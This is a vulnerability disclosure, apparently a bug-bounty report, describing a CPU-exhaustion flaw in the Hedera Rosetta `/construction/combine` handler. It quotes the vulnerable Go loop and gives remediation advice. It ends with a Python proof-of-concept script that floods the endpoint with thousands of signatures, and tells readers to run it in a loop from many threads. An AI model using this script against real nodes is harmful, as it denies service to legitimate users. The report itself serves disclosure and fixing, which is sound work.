### Title
Unbounded Ed25519 Verification Loop in `/construction/combine` Enables CPU Exhaustion DoS

### Summary
The `ConstructionCombine` handler in `rosetta/app/services/construction_service.go` iterates over an unbounded `Signatures` array and calls `ed25519.Verify()` for each entry with no application-level cap on signature count or rate limiting. An unauthenticated attacker can craft a single request containing thousands of attacker-signed (cryptographically valid) signatures followed by one deliberately invalid signature, forcing the server to execute thousands of Ed25519 verifications per request before returning `ErrInvalidSignatureVerification`. The only mitigations are optional Traefik infrastructure controls that are not enforced at the application layer.

### Finding Description
**Exact code path:**

`rosetta/app/services/construction_service.go`, function `ConstructionCombine`, lines 72–84:

```go
for _, signature := range request.Signatures {          // line 72 — unbounded iteration
    if signature.SignatureType != rTypes.Ed25519 {
        return nil, errors.ErrInvalidSignatureType
    }
    pubKey, err := hiero.PublicKeyFromBytes(signature.PublicKey.Bytes)
    if err != nil {
        return nil, errors.ErrInvalidPublicKey
    }
    if !ed25519.Verify(pubKey.Bytes(), frozenBodyBytes, signature.Bytes) {  // line 82 — crypto op
        return nil, errors.ErrInvalidSignatureVerification                  // line 83
    }
    _, _ = hiero.TransactionAddSignature(transaction, pubKey, signature.Bytes)
}
```

**Root cause:** The loop exits on the *first* failed verification. An attacker who controls the request can therefore force exactly N verifications by placing N−1 *valid* signatures (signed with attacker-generated key pairs over the same `frozenBodyBytes`) followed by one invalid signature. There is no cap on `len(request.Signatures)` anywhere in the application code.

**Failed assumption:** The design assumes callers submit one or a small fixed number of signatures matching the transaction's required signers. Nothing enforces this assumption.

**Why existing checks are insufficient:**

- The only application-level pre-check is `len(request.Signatures) == 0` (line 58) — it rejects empty but not oversized arrays.
- The Traefik middleware (`charts/hedera-mirror-rosetta/values.yaml` lines 149–166) provides `inFlightReq: amount: 5` per IP and `rateLimit: average: 10` per *request host* (shared across all clients). This is: (a) optional — only applied when `global.middleware` and `middleware` Helm values are set; (b) infrastructure-level, not enforced in the Go application; (c) bypassable via the amplification technique — 10 req/s × N verifications/req = 10N verifications/s.
- The middleware stack wired in `main.go` (lines 217–219) contains only `MetricsMiddleware`, `TracingMiddleware`, and `CorsMiddleware` — no rate limiting.

### Impact Explanation
A single HTTP request with N attacker-signed signatures + 1 invalid signature triggers N+1 calls to `crypto/ed25519.Verify`. At N=10,000 and Go's ~100k verifications/core/second, one request consumes ~100 ms of a CPU core. Ten concurrent such requests (easily achievable without Traefik) saturate a single core continuously. Scaling to multiple concurrent connections or larger N values can exhaust all available CPU, causing the Rosetta node to become unresponsive to legitimate traffic. Because the Rosetta node is a critical path for transaction construction and submission on the network, this constitutes a non-network-based DoS against infrastructure that may represent ≥25% of market-cap-weighted layer participation.

### Likelihood Explanation
The attack requires no credentials, no account, and no prior knowledge of the network state. The attacker only needs to:
1. Obtain any valid hex-encoded unsigned transaction (trivially available from `/construction/payloads` or public sources).
2. Generate N Ed25519 key pairs locally (milliseconds of attacker CPU).
3. Sign the transaction body bytes with each key pair.
4. Append one invalid 64-byte blob as the final signature.
5. POST the JSON payload to `/construction/combine`.

This is fully scriptable, repeatable, and requires no privileged access. The attack is amplifiable per-request, making it effective even against deployments with Traefik rate limiting.

### Recommendation
1. **Enforce a hard cap on signatures per request** at the application layer, before the verification loop:
   ```go
   const maxSignaturesPerRequest = 25 // Hedera transactions support at most ~25 signers
   if len(request.Signatures) > maxSignaturesPerRequest {
       return nil, errors.ErrInvalidArgument
   }
   ```
2. **Add application-level rate limiting** (e.g., `golang.org/x/time/rate`) on the `/construction/combine` handler, independent of infrastructure middleware.
3. **Enforce HTTP body size limits** on the server (`http.MaxBytesReader`) to prevent oversized payloads from reaching the handler.
4. Do not rely solely on optional Traefik middleware for DoS protection of CPU-intensive endpoints.

### Proof of Concept
```python
import ed25519  # pip install ed25519
import json, requests, binascii

UNSIGNED_TX = "<valid hex-encoded unsigned transaction from /construction/payloads>"
TX_BODY_BYTES = bytes.fromhex("<frozenBodyBytes hex>")  # signing payload bytes

signatures = []
N = 5000  # number of valid signatures to prepend

for _ in range(N):
    sk, vk = ed25519.create_keypair()
    sig = sk.sign(TX_BODY_BYTES)
    signatures.append({
        "signing_payload": {"hex_bytes": TX_BODY_BYTES.hex(), "signature_type": "ed25519"},
        "public_key": {"hex_bytes": vk.to_bytes().hex(), "curve_type": "edwards25519"},
        "signature_type": "ed25519",
        "hex_bytes": sig.hex()
    })

# Final entry: valid public key, INVALID signature bytes
sk_bad, vk_bad = ed25519.create_keypair()
signatures.append({
    "signing_payload": {"hex_bytes": TX_BODY_BYTES.hex(), "signature_type": "ed25519"},
    "public_key": {"hex_bytes": vk_bad.to_bytes().hex(), "curve_type": "edwards25519"},
    "signature_type": "ed25519",
    "hex_bytes": "aa" * 64  # invalid
})

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "unsigned_transaction": UNSIGNED_TX,
    "signatures": signatures
}

# Each POST triggers N+1 = 5001 Ed25519 verifications server-side
r = requests.post("http://<rosetta-host>/construction/combine", json=payload)
print(r.status_code, r.json())  # expects 500 ErrInvalidSignatureVerification after 5001 verifications
```

Send this in a loop from multiple threads to exhaust server CPU.